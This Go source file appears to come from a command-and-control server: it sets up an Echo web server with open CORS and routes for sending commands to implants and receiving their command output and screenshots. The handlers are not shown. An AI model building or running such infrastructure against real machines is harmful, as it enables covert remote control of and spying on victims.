package c2server

import (
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
)

func Server(port string) {

	corsConfig := middleware.CORSConfig{
		AllowOrigins: []string{"*"},
	}

	srv := echo.New()
	srv.Use(middleware.Recover())
	srv.Use(middleware.Secure())
	srv.Use(middleware.CORSWithConfig(corsConfig))

	//Routes
	srv.GET("/", MainControll)
	srv.POST("/", GetOutput)
	srv.POST("/screen", Screenshot)

	//Start Server
	srv.Logger.Fatal(srv.Start(":" + port))

}
